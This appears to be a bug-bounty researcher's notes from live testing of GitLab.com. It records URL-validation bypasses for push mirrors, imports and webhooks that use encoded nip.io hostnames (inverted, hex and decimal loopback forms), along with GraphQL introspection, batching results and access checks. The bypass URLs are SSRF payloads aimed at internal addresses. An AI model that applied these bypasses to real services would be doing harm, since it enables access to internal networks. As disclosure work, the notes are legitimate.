# Live Testing Results — GitLab.com

Tested 2026-05-30 with PAT (user: h0d4r1-bugbounty, project ID 82711314).

## Push Mirror — Creation-time URL Bypass

- `http://localhost:8080/mirror.git` → ❌ 400: "is blocked: Requests to localhost"
- `http://1.0.0.127.nip.io:8080/mirror.git` → ✅ Created (ID 4053688, enabled: true, last_error: null)

Why it passed: `1.0.0.127.nip.io` resolves to `1.0.0.127` — a public IP (APNIC), not loopback. The validator only blocks actual private/loopback IPs. The inverted nip.io format (`1.0.0.127` instead of `127.0.0.1`) is the key — it resolves to a public IP.

## Import System — Live Connection Attempts

- `http://1.0.0.127.nip.io:8080/test.git` → Error: "Unable to access repository with the URL and credentials provided"
  
This means GitLab made a live HTTP connection to the provided URL and received a response (not a valid Git repo). Confirms outbound HTTP connections to user-provided URLs.

## Webhook Creation — URL Bypass

| URL | Result | Webhook ID |
|-----|--------|------------|
| `http://127.0.0.1.nip.io:8080/test` | ❌ 422 blocked | — |
| `http://1.0.0.127.nip.io:8080/webhook` | ✅ Created (executable) | 79786008 |
| `http://1.1.1.1.nip.io:8080/test` | ✅ Created (executable) | 79786030 |
| `http://0x7f000001.nip.io:8080/test` | ✅ Created (executable) | 79786031 |
| `http://2130706433.nip.io:8080/test` | ✅ Created (executable) | 79786032 |
| `http://65535.nip.io:8080/test` | ✅ Created (executable) | 79786033 |
| `http://0.nip.io:8080/test` | ✅ Created (executable) | 79786035 |

All remain `alert_status: "executable"` — none disabled. External webhook to webhook.site successfully fired (GitLab/19.1.0-pre from IP 34.74.226.28).

## GraphQL

- Full introspection: 3,873 types, 625 Mutation fields, 163 Query fields, 34 Subscription fields
- Alias batching confirmed: 10+ independent queries in a single HTTP request
- Project members on public projects visible (username, name, access level)
- CI variables properly protected (403 on non-owned projects)

## Package Registry

- Generic package upload via PUT: 201 Created
- Download URL served internally by Workhorse

## REST API

- Project CI variables: 403 on gitlab-org/gitlab (properly protected)
- Deploy keys: 403 on gitlab-org/gitlab
- Audit events: 403 on all levels
- License/sidekiq/app stats: 403
